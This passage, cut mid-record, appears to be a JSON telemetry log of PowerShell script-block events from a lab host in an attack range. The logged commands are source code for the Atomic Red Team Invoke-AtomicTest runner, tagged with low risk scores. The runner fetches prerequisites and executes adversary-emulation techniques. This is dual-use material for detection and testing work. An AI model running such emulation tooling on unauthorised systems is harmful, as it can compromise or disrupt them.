-TestNumbers $TestNumbers\"\n            }\n\n            if ($null -ne $TestNames) {\n                $commandLine = \"$commandLine -TestNames $TestNames\"\n            }\n\n            if ($null -ne $TestGuids) {\n                $commandLine = \"$commandLine -TestGuids $TestGuids\"\n            }\n\n            $commandLine = \"$commandLine -PathToAtomicsFolder $PathToAtomicsFolder\"\n\n            if ($CheckPrereqs -ne $false) {\n                $commandLine = \"$commandLine -CheckPrereqs $CheckPrereqs\"\n            }\n\n            if ($PromptForInputArgs -ne $false) {\n                $commandLine = \"$commandLine -PromptForInputArgs $PromptForInputArgs\"\n            }\n\n            if ($GetPrereqs -ne $false) {\n                $commandLine = \"$commandLine -GetPrereqs $GetPrereqs\"\n            }\n\n            if ($Cleanup -ne $false) {\n                $commandLine = \"$commandLine -Cleanup $Cleanup\"\n            }\n\n            if ($NoExecutionLog -ne $false) {\n                $commandLine = \"$commandLine -NoExecutionLog $NoExecutionLog\"\n            }\n\n            $commandLine = \"$commandLine -ExecutionLogPath $ExecutionLogPath\"\n\n            if ($Force -ne $false) {\n                $commandLine = \"$commandLine -Force $Force\"\n            }\n\n            if ($InputArgs -ne $null) {\n                $commandLine = \"$commandLine -InputArgs $InputArgs\"\n            }\n\n            $commandLine = \"$commandLine -TimeoutSeconds $TimeoutSeconds\"\n            if ($PSBoundParameters.ContainsKey('Session')) {\n                if ( $null -eq $Session ) {\n                    Write-Error \"The provided session is null and cannot be used.\"\n                    continue\n                }\n                else {\n                    $commandLine = \"$commandLine -Session $Session\"\n                }\n            }\n\n            if ($Interactive -ne $false) {\n                $commandLine = \"$commandLine -Interactive $Interactive\"\n            }\n\n            if ($KeepStdOutStdErrFiles -ne $false) {\n                $commandLine = \"$commandLine -KeepStdOutStdErrFiles $KeepStdOutStdErrFiles\"\n            }\n\n            if ($null -ne $LoggingModule) {\n                $commandLine = \"$commandLine -LoggingModule $LoggingModule\"\n            }\n\n            $startTime = Get-Date\n            ConvertTo-LoggerArray $LoggingModule | ForEach-Object {\n                &\"$_\\Start-ExecutionLog\" $startTime $ExecutionLogPath $executionHostname $executionUser $commandLine (-Not($IsLinux -or $IsMacOS))\n            }\n        }\n\n        function Platform-IncludesCloud {\n            $cloud = ('office-365', 'azure-ad', 'google-workspace', 'saas', 'iaas', 'containers', 'iaas:aws', 'iaas:azure', 'iaas:gcp')\n            foreach ($platform in $test.supported_platforms) {\n                if ($cloud -contains $platform) {\n                    return $true\n                }\n            }\n            return $false\n        }\n\n        function Test-IncludesTerraform($AT, $testCount) {\n            $AT = $AT.ToUpper()\n            $pathToTerraform = Join-Path $PathToAtomicsFolder \"\\$AT\\src\\$AT-$testCount\\$AT-$testCount.tf\"\n            $cloud = ('iaas', 'containers', 'iaas:aws', 'iaas:azure', 'iaas:gcp')\n            foreach ($platform in $test.support",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 2,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:55.2537476+00:00",
      "event_id": 35710718,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 195,
      "full_command": "function Get-PrereqExecutor ($test) {\n    if ($nul -eq $test.dependency_executor_name) { $executor = $test.executor.name }\n    else { $executor = $test.dependency_executor_name }\n    $executor\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:56.0913988+00:00",
      "event_id": 35710883,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 10875,
      "full_command": "e ($AT) {\n\n            $AT = $AT.ToUpper()\n            $pathToYaml = Join-Path $PathToAtomicsFolder \"\\$AT\\$AT.yaml\"\n            if (Test-Path -Path $pathToYaml) { $AtomicTechniqueHash = Get-AtomicTechnique -Path $pathToYaml }\n            else {\n                Write-Host -Fore Red \"ERROR: $PathToYaml does not exist`nCheck your Atomic Number and your PathToAtomicsFolder parameter\"\n                return\n            }\n            $techniqueCount = 0\n            $numAtomicsApplicableToPlatform = 0\n            $techniqueString = \"\"\n            foreach ($technique in $AtomicTechniqueHash) {\n                $techniqueString = $technique.attack_technique[0]\n                $techniqueCount++\n\n                $props = @{\n                    Activity        = \"Running $($technique.display_name.ToString()) Technique\"\n                    Status          = 'Progress:'\n                    PercentComplete = ($techniqueCount / ($AtomicTechniqueHash).Count * 100)\n                }\n                Write-Progress @props\n\n                Write-Debug -Message \"Gathering tests for Technique $technique\"\n\n                $testCount = 0\n                foreach ($test in $technique.atomic_tests) {\n\n                    Write-Verbose -Message 'Determining tests for target platform'\n\n                    $testCount++\n\n                    if (-not $anyOS) {\n                        if ( -not $(Platform-IncludesCloud) -and -Not $test.supported_platforms.Contains($executionPlatform) ) {\n                            Write-Verbose -Message \"Unable to run non-$executionPlatform tests\"\n                            continue\n                        }\n\n                        if ( $executionPlatform -eq \"windows\" -and ($test.executor.name -eq \"sh\" -or $test.executor.name -eq \"bash\")) {\n                            Write-Verbose -Message \"Unable to run sh or bash on $executionPlatform\"\n                            continue\n                        }\n                        if ( (\"linux\", \"macos\") -contains $executionPlatform -and $test.executor.name -eq \"command_prompt\") {\n                            Write-Verbose -Message \"Unable to run cmd.exe on $executionPlatform\"\n                            continue\n                        }\n                    }\n\n\n                    if ($null -ne $TestNumbers) {\n                        if (-Not ($TestNumbers -contains $testCount) ) { continue }\n                    }\n\n                    if ($null -ne $TestNames) {\n                        if (-Not ($TestNames -contains $test.name) ) { continue }\n                    }\n\n                    if ($null -ne $TestGuids) {\n                        if (-Not ($TestGuids -contains $test.auto_generated_guid) ) { continue }\n                    }\n\n                    $props = @{\n                        Activity        = 'Running Atomic Tests'\n                        Status          = 'Progress:'\n                        PercentComplete = ($testCount / ($technique.atomic_tests).Count * 100)\n                    }\n                    Write-Progress @props\n\n                    Write-Verbose -Message 'Determining manual tests'\n\n                    if ($test.executor.name.Contains('manual')) {\n                        Write-Verbose -Message 'Unable to run manual tests'\n                        continue\n                    }\n                    $numAtomicsApplicableToPlatform++\n\n                    $testId = \"$AT-$testCount $($test.name)\"\n                    if ($ShowDetailsBrief) {\n                        Write-KeyValue $testId\n                        continue\n                    }\n\n                    if ($PromptForInputArgs) {\n                        $InputArgs = Invoke-PromptForInputArgs $test.input_arguments\n                    }\n\n                    if ($ShowDetails) {\n                        Show-Details $test $testCount $technique $InputArgs $PathToPayloads\n                        continue\n                    }\n\n                    Write-Debug -Message 'Gathering final Atomic test command'\n\n\n                    if ($CheckPrereqs) {\n                        Write-KeyValue \"CheckPrereq's for: \" $testId\n                        $failureReasons = Invoke-CheckPrereqs $test $isElevated $executionPlatform $InputArgs $PathToPayloads $TimeoutSeconds $session\n                        Write-PrereqResults $FailureReasons $testId\n                    }\n                    elseif ($GetPrereqs) {\n                        if ($(Test-IncludesTerraform $AT $testCount)) {\n                            Build-TFVars $AT $testCount $InputArgs\n                        }\n                        Write-KeyValue \"GetPrereq's for: \" $testId\n                        if ( $test.executor.elevation_required -and -not $isElevated) {\n                            Write-Host -ForegroundColor Red \"Elevation required but not provided\"\n                        }\n                        if ($nul -eq $test.dependencies) { Write-KeyValue \"No Preqs Defined\"; continue }\n                        foreach ($dep in $test.dependencies) {\n                            $executor = Get-PrereqExecutor $test\n                            $description = (Merge-InputArgs $dep.description $test $InputArgs $PathToPayloads).trim()\n                            Write-KeyValue  \"Attempting to satisfy prereq: \" $description\n                            $final_command_prereq = Merge-InputArgs $dep.prereq_command $test $InputArgs $PathToPayloads\n                            if ($executor -ne \"powershell\") { $final_command_prereq = ($final_command_prereq.trim()).Replace(\"`n\", \" && \") }\n                            $final_command_get_prereq = Merge-InputArgs $dep.get_prereq_command $test $InputArgs $PathToPayloads\n                            $res = Invoke-ExecuteCommand $final_command_prereq $executor $executionPlatform $TimeoutSeconds $session -Interactive:$true\n\n                            if ($res.ExitCode -eq 0) {\n                                Write-KeyValue \"Prereq already met: \" $description\n                            }\n                            else {\n                                $res = Invoke-ExecuteCommand $final_command_get_prereq $executor $executionPlatform $TimeoutSeconds $session -Interactive:$Interactive\n                                $res = Invoke-ExecuteCommand $final_command_prereq $executor $executionPlatform $TimeoutSeconds $session -Interactive:$true\n                                if ($res.ExitCode -eq 0) {\n                                    Write-KeyValue \"Prereq successfully met: \" $description\n                                }\n                                else {\n                                    Write-Host -ForegroundColor Red \"Failed to meet prereq: $description\"\n                                }\n                            }\n                        }\n                    }\n                    elseif ($Cleanup) {\n                        Write-KeyValue \"Executing cleanup for test: \" $testId\n                        $final_command = Merge-InputArgs $test.executor.cleanup_command $test $InputArgs $PathToPayloads\n                        if (Get-Command 'Invoke-ARTPreAtomicCleanupHook' -errorAction SilentlyContinue) { Invoke-ARTPreAtomicCleanupHook $test $InputArgs }\n                        $res = Invoke-ExecuteCommand $final_command $test.executor.name $executionPlatform $TimeoutSeconds $session -Interactive:$Interactive\n                        Write-KeyValue \"Done executing cleanup for test: \" $testId\n                        if (Get-Command 'Invoke-ARTPostAtomicCleanupHook' -errorAction SilentlyContinue) { Invoke-ARTPostAtomicCleanupHook $test $InputArgs }\n                        if ($(Test-IncludesTerraform $AT $testCount)) {\n                            Remove-TerraformFiles $AT $testCount\n                        }\n                    }\n                    else {\n                        Write-KeyValue \"Executing test: \" $testId\n                        $startTime = Get-Date\n                        $final_command = Merge-InputArgs $test.executor.command $test $InputArgs $PathToPayloads\n                        if (Get-Command 'Invoke-ARTPreAtomicHook' -errorAction SilentlyContinue) { Invoke-ARTPreAtomicHook $test $InputArgs }\n                        $res = Invoke-ExecuteCommand $final_command $test.executor.name $executionPlatform $TimeoutSeconds $session -Interactive:$Interactive\n                        Write-Host \"Exit code: $($res.ExitCode)\"\n                        if (Get-Command 'Invoke-ARTPostAtomicHook' -errorAction SilentlyContinue) { Invoke-ARTPostAtomicHook $test $InputArgs }\n                        $stopTime = Get-Date\n                        if ($isLoggingModuleSet) {\n                            ConvertTo-LoggerArray $LoggingModule | ForEach-Object {\n                                &\"$_\\Write-ExecutionLog\" $startTime $stopTime $AT $testCount $test.name $test.auto_generated_guid $test.executor.name $test.description $final_command $ExecutionLogPath $executionHostname $executionUser $res (-Not($IsLinux -or $IsMacOS))\n                            }\n                        }\n                        Write-KeyValue \"Done executing test: \" $testId\n                    }\n\n                } # End of foreach Test in single Atomic Technique\n            } # End of foreach Technique in Atomic Tests\n            if ($numAtomicsApplicableToPlatform -eq 0) {\n                Write-Host -ForegroundColor Yellow \"Found $numAtomicsApplicableToPlatform atomic tests applicable to $executionPlatform platform for Technique $techniqueString\"\n            }\n        } # End of Invoke-AtomicTestSingle function\n\n        if ($AtomicTechnique -eq \"All\") {\n            function Invoke-AllTests() {\n                $AllAtomicTests = New-Object System.Collections.ArrayList\n                Get-ChildItem $PathToAtomicsFolder -Directory -Filter T* | ForEach-Object {\n                    $currentTechnique = [System.IO.Path]::GetFileName($_.FullName)\n                    if ( $currentTechnique -match \"T[0-9]{4}.?([0-9]{3})?\" ) { $AllAtomicTests.Add($currentTechnique) | Out-Null }\n                }\n                $AllAtomicTests.GetEnumerator() | Foreach-Object { Invoke-AtomicTestSingle $_ }\n            }\n\n            if ( ($Force -or $CheckPrereqs -or $ShowDetails -or $ShowDetailsBrief -or $GetPrereqs) -or $psCmdlet.ShouldContinue( 'Do you wish to execute all tests?',\n                    \"Highway to the danger zone, Executing All Atomic Tests!\" ) ) {\n                Invoke-AllTests\n            }\n        }\n        else {\n            Invoke-AtomicTestSingle $AtomicTechnique\n        }\n\n        if ($isLoggingModuleSet) {\n            ConvertTo-LoggerArray $LoggingModule | ForEach-Object {\n                &\"$_\\Stop-ExecutionLog\" $startTime $ExecutionLogPath $executionHostname $executionUser (-Not($IsLinux -or $IsMacOS))\n            }\n        }\n\n    } # End of PROCESS block\n    END { } # Intentionally left blank and can be removed\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 2,
      "message_total": 2,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:56.0913667+00:00",
      "event_id": 35710882,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 13383,
      "full_command": "function Invoke-AtomicTest {\n    [CmdletBinding(DefaultParameterSetName = 'technique',\n        SupportsShouldProcess = $true,\n        PositionalBinding = $false,\n        ConfirmImpact = 'Medium')]\n    Param(\n        [Parameter(Mandatory = $true,\n            Position = 0,\n            ValueFromPipelineByPropertyName = $true,\n            ParameterSetName = 'technique')]\n        [ValidateNotNullOrEmpty()]\n        [String[]]\n        $AtomicTechnique,\n\n        [Parameter(Mandatory = $false,\n            ValueFromPipelineByPropertyName = $true,\n            ParameterSetName = 'technique')]\n        [switch]\n        $ShowDetails,\n\n        [Parameter(Mandatory = $false,\n            ValueFromPipelineByPropertyName = $true,\n            ParameterSetName = 'technique')]\n        [switch]\n        $ShowDetailsBrief,\n\n        [Parameter(Mandatory = $false,\n            ValueFromPipelineByPropertyName = $true,\n            ParameterSetName = 'technique')]\n        [switch]\n        $anyOS,\n\n        [Parameter(Mandatory = $false,\n            ParameterSetName = 'technique')]\n        [String[]]\n        $TestNumbers,\n\n        [Parameter(Mandatory = $false,\n            ParameterSetName = 'technique')]\n        [String[]]\n        $TestNames,\n\n        [Parameter(Mandatory = $false,\n            ParameterSetName = 'technique')]\n        [String[]]\n        $TestGuids,\n\n        [Parameter(Mandatory = $false,\n            ParameterSetName = 'technique')]\n        [String]\n        $PathToAtomicsFolder = $( if ($IsLinux -or $IsMacOS) { $Env:HOME + \"/AtomicRedTeam/atomics\" } else { $env:HOMEDRIVE + \"\\AtomicRedTeam\\atomics\" }),\n\n        [Parameter(Mandatory = $false,\n            ValueFromPipelineByPropertyName = $true,\n            ParameterSetName = 'technique')]\n        [switch]\n        $CheckPrereqs = $false,\n\n        [Parameter(Mandatory = $false,\n            ValueFromPipelineByPropertyName = $true,\n            ParameterSetName = 'technique')]\n        [switch]\n        $PromptForInputArgs = $false,\n\n        [Parameter(Mandatory = $false,\n            ValueFromPipelineByPropertyName = $true,\n            ParameterSetName = 'technique')]\n        [switch]\n        $GetPrereqs = $false,\n\n        [Parameter(Mandatory = $false,\n            ValueFromPipelineByPropertyName = $true,\n            ParameterSetName = 'technique')]\n        [switch]\n        $Cleanup = $false,\n\n        [Parameter(Mandatory = $false,\n            ParameterSetName = 'technique')]\n        [switch]\n        $NoExecutionLog = $false,\n\n        [Parameter(Mandatory = $false,\n            ParameterSetName = 'technique')]\n        [String]\n        $ExecutionLogPath = $( if ($IsLinux -or $IsMacOS) { \"/tmp/Invoke-AtomicTest-ExecutionLog.csv\" } else { \"$env:TEMP\\Invoke-AtomicTest-ExecutionLog.csv\" }),\n\n        [Parameter(Mandatory = $false,\n            ParameterSetName = 'technique')]\n        [switch]\n        $Force,\n\n        [Parameter(Mandatory = $false,\n            ParameterSetName = 'technique')]\n        [HashTable]\n        $InputArgs,\n\n        [Parameter(Mandatory = $false,\n            ParameterSetName = 'technique')]\n        [Int]\n        $TimeoutSeconds = 120,\n\n        [Parameter(Mandatory = $false, ParameterSetName = 'technique')]\n        [System.Management.Automation.Runspaces.PSSession[]]$Session,\n\n        [Parameter(Mandatory = $false,\n            ValueFromPipelineByPropertyName = $true,\n            ParameterSetName = 'technique')]\n        [switch]\n        $Interactive = $false,\n\n        [Parameter(Mandatory = $false,\n            ValueFromPipelineByPropertyName = $true,\n            ParameterSetName = 'technique')]\n        [switch]\n        $KeepStdOutStdErrFiles = $false,\n\n        [Parameter(Mandatory = $false,\n            ParameterSetName = 'technique')]\n        [String]\n        $LoggingModule,\n\n        [Parameter(Mandatory = $false,\n            ParameterSetName = 'technique')]\n        [switch]\n        $SupressPathToAtomicsFolder = $false\n\n    )\n    BEGIN { } # Intentionally left blank and can be removed\n    PROCESS {\n        function ConvertTo-LoggerArray {\n            param (\n                [Parameter(Mandatory = $true)]\n                [string]$Loggers\n            )\n\n            return $Loggers -split ',' | ForEach-Object { $_.Trim() }\n        }\n\n        $PathToAtomicsFolder = (Resolve-Path $PathToAtomicsFolder).Path\n\n        Write-Verbose -Message 'Attempting to run Atomic Techniques'\n        if (-not $supressPathToAtomicsFolder) { Write-Host -ForegroundColor Cyan \"PathToAtomicsFolder = $PathToAtomicsFolder`n\" }\n\n        $executionPlatform, $isElevated, $tmpDir, $executionHostname, $executionUser = Get-TargetInfo $Session\n        $PathToPayloads = if ($Session) { \"$tmpDir`AtomicRedTeam\" }  else { $PathToAtomicsFolder }\n\n        # Since there might a comma(T1559-1,2,3) Powershell takes it as array.\n        # So converting it back to string.\n        if ($AtomicTechnique -is [array]) {\n            $AtomicTechnique = $AtomicTechnique -join \",\"\n        }\n\n        # Splitting Atomic Technique short form into technique and test numbers.\n        $AtomicTechniqueParams = ($AtomicTechnique -split '-')\n        $AtomicTechnique = $AtomicTechniqueParams[0]\n\n        if ($AtomicTechniqueParams.Length -gt 1) {\n            $ShortTestNumbers = $AtomicTechniqueParams[-1]\n        }\n\n        if ($null -eq $TestNumbers -and $null -ne $ShortTestNumbers) {\n            $TestNumbers = $ShortTestNumbers -split ','\n        }\n\n        $isLoggingModuleSet = $false\n        if (-not $NoExecutionLog) {\n            $isLoggingModuleSet = $true\n            if (-not $PSBoundParameters.ContainsKey('LoggingModule')) {\n                # no logging module explicitly set\n                # syslog logger\n                $syslogOptionsSet = [bool]$artConfig.syslogServer -and [bool]$artConfig.syslogPort\n                if ( $artConfig.LoggingModule -eq \"Syslog-ExecutionLogger\" -or (($artConfig.LoggingModule -eq '') -and $syslogOptionsSet) ) {\n                    if ($syslogOptionsSet) {\n                        $LoggingModule = \"Syslog-ExecutionLogger\"\n                    }\n                    else {\n                        Write-Host -Fore Yellow \"Config.ps1 specified: Syslog-ExecutionLogger, but the syslogServer and syslogPort must be specified. Using the default logger instead\"\n                        $LoggingModule = \"Default-ExecutionLogger\"\n                    }\n                }\n                elseif (-not [bool]$artConfig.LoggingModule) {\n                    # loggingModule is blank (not set), so use the default logger\n                    $LoggingModule = \"Default-ExecutionLogger\"\n                }\n                else {\n                    $LoggingModule = $artConfig.LoggingModule\n                }\n            }\n        }\n\n        if ($isLoggingModuleSet) {\n            ConvertTo-LoggerArray $LoggingModule | ForEach-Object {\n                if (Get-Module -name $_) {\n                    Write-Verbose \"Using Logger: $_\"\n                }\n                else {\n                    Write-Host -Fore Yellow \"Logger not found: \", $_\n                }\n\n                # Change the defult logFile extension from csv to json and add a timestamp if using the Attire-ExecutionLogger\n                if ($_ -eq \"Attire-ExecutionLogger\") { $ExecutionLogPath = $ExecutionLogPath.Replace(\"Invoke-AtomicTest-ExecutionLog.csv\", \"Invoke-AtomicTest-ExecutionLog-timestamp.json\") }\n                $ExecutionLogPath = $ExecutionLogPath.Replace(\"timestamp\", $(Get-Date -UFormat %s))\n\n                if (Get-Command \"$_\\Start-ExecutionLog\" -erroraction silentlycontinue) {\n                    if (Get-Command \"$_\\Write-ExecutionLog\" -erroraction silentlycontinue) {\n                        if (Get-Command \"$_\\Stop-ExecutionLog\" -erroraction silentlycontinue) {\n                            Write-Verbose \"All logging commands found\"\n                        }\n                        else {\n                            Write-Host \"Stop-ExecutionLog not found or loaded from the wrong module\"\n                            return\n                        }\n                    }\n                    else {\n                        Write-Host \"Write-ExecutionLog not found or loaded from the wrong module\"\n                        return\n                    }\n                }\n                else {\n                    Write-Host \"Start-ExecutionLog not found or loaded from the wrong module\"\n                    return\n                }\n            }\n\n            # Here we're rebuilding an equivalent command line to put in the logs\n            $commandLine = \"Invoke-AtomicTest $AtomicTechnique\"\n\n            if ($ShowDetails -ne $false) {\n                $commandLine = \"$commandLine -ShowDetails $ShowDetails\"\n            }\n\n            if ($ShowDetailsBrief -ne $false) {\n                $commandLine = \"$commandLine -ShowDetailsBrief $ShowDetailsBrief\"\n            }\n\n            if ($null -ne $TestNumbers) {\n                $commandLine = \"$commandLine -TestNumbers $TestNumbers\"\n            }\n\n            if ($null -ne $TestNames) {\n                $commandLine = \"$commandLine -TestNames $TestNames\"\n            }\n\n            if ($null -ne $TestGuids) {\n                $commandLine = \"$commandLine -TestGuids $TestGuids\"\n            }\n\n            $commandLine = \"$commandLine -PathToAtomicsFolder $PathToAtomicsFolder\"\n\n            if ($CheckPrereqs -ne $false) {\n                $commandLine = \"$commandLine -CheckPrereqs $CheckPrereqs\"\n            }\n\n            if ($PromptForInputArgs -ne $false) {\n                $commandLine = \"$commandLine -PromptForInputArgs $PromptForInputArgs\"\n            }\n\n            if ($GetPrereqs -ne $false) {\n                $commandLine = \"$commandLine -GetPrereqs $GetPrereqs\"\n            }\n\n            if ($Cleanup -ne $false) {\n                $commandLine = \"$commandLine -Cleanup $Cleanup\"\n            }\n\n            if ($NoExecutionLog -ne $false) {\n                $commandLine = \"$commandLine -NoExecutionLog $NoExecutionLog\"\n            }\n\n            $commandLine = \"$commandLine -ExecutionLogPath $ExecutionLogPath\"\n\n            if ($Force -ne $false) {\n                $commandLine = \"$commandLine -Force $Force\"\n            }\n\n            if ($InputArgs -ne $null) {\n                $commandLine = \"$commandLine -InputArgs $InputArgs\"\n            }\n\n            $commandLine = \"$commandLine -TimeoutSeconds $TimeoutSeconds\"\n            if ($PSBoundParameters.ContainsKey('Session')) {\n                if ( $null -eq $Session ) {\n                    Write-Error \"The provided session is null and cannot be used.\"\n                    continue\n                }\n                else {\n                    $commandLine = \"$commandLine -Session $Session\"\n                }\n            }\n\n            if ($Interactive -ne $false) {\n                $commandLine = \"$commandLine -Interactive $Interactive\"\n            }\n\n            if ($KeepStdOutStdErrFiles -ne $false) {\n                $commandLine = \"$commandLine -KeepStdOutStdErrFiles $KeepStdOutStdErrFiles\"\n            }\n\n            if ($null -ne $LoggingModule) {\n                $commandLine = \"$commandLine -LoggingModule $LoggingModule\"\n            }\n\n            $startTime = Get-Date\n            ConvertTo-LoggerArray $LoggingModule | ForEach-Object {\n                &\"$_\\Start-ExecutionLog\" $startTime $ExecutionLogPath $executionHostname $executionUser $commandLine (-Not($IsLinux -or $IsMacOS))\n            }\n        }\n\n        function Platform-IncludesCloud {\n            $cloud = ('office-365', 'azure-ad', 'google-workspace', 'saas', 'iaas', 'containers', 'iaas:aws', 'iaas:azure', 'iaas:gcp')\n            foreach ($platform in $test.supported_platforms) {\n                if ($cloud -contains $platform) {\n                    return $true\n                }\n            }\n            return $false\n        }\n\n        function Test-IncludesTerraform($AT, $testCount) {\n            $AT = $AT.ToUpper()\n            $pathToTerraform = Join-Path $PathToAtomicsFolder \"\\$AT\\src\\$AT-$testCount\\$AT-$testCount.tf\"\n            $cloud = ('iaas', 'containers', 'iaas:aws', 'iaas:azure', 'iaas:gcp')\n            foreach ($platform in $test.supported_platforms) {\n                if ($cloud -contains $platform) {\n                    return $(Test-Path -Path $pathToTerraform)\n                }\n            }\n            return $false\n        }\n\n        function Build-TFVars($AT, $testCount, $InputArgs) {\n            $tmpDirPath = Join-Path $PathToAtomicsFolder \"\\$AT\\src\\$AT-$testCount\"\n            if ($InputArgs) {\n                $destinationVarsPath = Join-Path \"$tmpDirPath\" \"terraform.tfvars.json\"\n                $InputArgs | ConvertTo-Json | Out-File -FilePath $destinationVarsPath\n            }\n        }\n\n        function Remove-TerraformFiles($AT, $testCount) {\n            $tmpDirPath = Join-Path $PathToAtomicsFolder \"\\$AT\\src\\$AT-$testCount\"\n            Write-Host $tmpDirPath\n            $tfStateFile = Join-Path $tmpDirPath \"terraform.tfstate\"\n            $tfvarsFile = Join-Path $tmpDirPath \"terraform.tfvars.json\"\n            if ($(Test-Path $tfvarsFile)) {\n                Remove-Item -LiteralPath $tfvarsFile -Force\n            }\n            if ($(Test-Path $tfStateFile)) {\n                (Get-ChildItem -Path $tmpDirPath).Fullname -match \"terraform.tfstate*\" | Remove-Item -Force\n            }\n        }\n\n        function Invoke-AtomicTestSingl",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 2,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:55.2755894+00:00",
      "event_id": 35710733,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 1945,
      "full_command": "function Get-InputArgs([hashtable]$ip, $customInputArgs, $PathToAtomicsFolder) {\n    $defaultArgs = @{ }\n    foreach ($key in $ip.Keys) {\n        $defaultArgs[$key] = $ip[$key].default\n    }\n    # overwrite defaults with any user supplied values\n    foreach ($key in $customInputArgs.Keys) {\n        if ($defaultArgs.Keys -contains $key) {\n            # replace default with user supplied\n            $defaultArgs.set_Item($key, $customInputArgs[$key])\n        }\n        else {\n            Write-Verbose \"The specified input argument *$key* was ignored as not applicable\"\n        }\n    }\n    $defaultArgs\n}\n\nfunction Merge-InputArgs($finalCommand, $test, $customInputArgs, $PathToAtomicsFolder) {\n    if (($null -ne $finalCommand) -and ($test.input_arguments.Count -gt 0)) {\n        Write-Verbose -Message 'Replacing inputArgs with user specified values, or default values if none provided'\n        $inputArgs = Get-InputArgs $test.input_arguments $customInputArgs $PathToAtomicsFolder\n\n        foreach ($key in $inputArgs.Keys) {\n            $findValue = '#{' + $key + '}'\n            $finalCommand = $finalCommand.Replace($findValue, $inputArgs[$key])\n        }\n    }\n\n    # Replace $PathToAtomicsFolder or PathToAtomicsFolder with the actual -PathToAtomicsFolder value\n    $finalCommand = ($finalCommand -replace \"\\`$PathToAtomicsFolder\", $PathToAtomicsFolder) -replace \"PathToAtomicsFolder\", $PathToAtomicsFolder\n\n    $finalCommand\n}\n\nfunction Invoke-PromptForInputArgs([hashtable]$ip) {\n    $InputArgs = @{ }\n    foreach ($key in $ip.Keys) {\n        $InputArgs[$key] = $ip[$key].default\n        $newValue = Read-Host -Prompt \"Enter a value for $key , or press enter to accept the default.`n$($ip[$key].description.trim()) [$($ip[$key].default.trim())]\"\n        # replace default with user supplied\n        if (-not [string]::IsNullOrWhiteSpace($newValue)) {\n            $InputArgs.set_Item($key, $newValue)\n        }\n    }\n    $InputArgs\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:55.1367354+00:00",
      "event_id": 35710669,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 1654,
      "full_command": "function Start-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $commandLine, $isWindows) {\n    if ($isWindows -and -not [System.Diagnostics.EventLog]::Exists('Atomic Red Team')) {\n        New-EventLog -Source \"Applications and Services Logs\" -LogName \"Atomic Red Team\"\n    }\n}\n\nfunction Write-ExecutionLog($startTime, $stopTime, $technique, $testNum, $testName, $testGuid, $testExecutor, $testDescription, $command, $logPath, $targetHostname, $targetUser, $res, $isWindows) {\n    $timeUTC = (Get-Date($startTime).toUniversalTime() -uformat \"%Y-%m-%dT%H:%M:%SZ\").ToString()\n    $timeLocal = (Get-Date($startTime) -uformat \"%Y-%m-%dT%H:%M:%SZ\").ToString()\n    $ipAddress = Get-PreferredIPAddress $isWindows\n\n    $msg = [PSCustomObject][ordered]@{\n        \"Execution Time (UTC)\"   = $timeUTC\n        \"Execution Time (Local)\" = $timeLocal\n        \"Technique\"              = $technique\n        \"Test Number\"            = $testNum\n        \"Test Name\"              = $testName\n        \"Hostname\"               = $targetHostname\n        \"IP Address\"             = $ipAddress\n        \"Username\"               = $targetUser\n        \"GUID\"                   = $testGuid\n        \"Tag\"                    = \"atomicrunner\"\n        \"CustomTag\"              = $artConfig.CustomTag\n        \"ProcessId\"              = $res.ProcessId\n        \"ExitCode\"               = $res.ExitCode\n    }\n\n    Write-EventLog  -Source \"Applications and Services Logs\" -LogName \"Atomic Red Team\" -EventID 3001 -EntryType Information -Message $msg -Category 1 -RawData 10, 20\n}\n\nfunction Stop-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $isWindows) {\n\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:56.0189258+00:00",
      "event_id": 35710860,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 1654,
      "full_command": "function Start-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $commandLine, $isWindows) {\n    if ($isWindows -and -not [System.Diagnostics.EventLog]::Exists('Atomic Red Team')) {\n        New-EventLog -Source \"Applications and Services Logs\" -LogName \"Atomic Red Team\"\n    }\n}\n\nfunction Write-ExecutionLog($startTime, $stopTime, $technique, $testNum, $testName, $testGuid, $testExecutor, $testDescription, $command, $logPath, $targetHostname, $targetUser, $res, $isWindows) {\n    $timeUTC = (Get-Date($startTime).toUniversalTime() -uformat \"%Y-%m-%dT%H:%M:%SZ\").ToString()\n    $timeLocal = (Get-Date($startTime) -uformat \"%Y-%m-%dT%H:%M:%SZ\").ToString()\n    $ipAddress = Get-PreferredIPAddress $isWindows\n\n    $msg = [PSCustomObject][ordered]@{\n        \"Execution Time (UTC)\"   = $timeUTC\n        \"Execution Time (Local)\" = $timeLocal\n        \"Technique\"              = $technique\n        \"Test Number\"            = $testNum\n        \"Test Name\"              = $testName\n        \"Hostname\"               = $targetHostname\n        \"IP Address\"             = 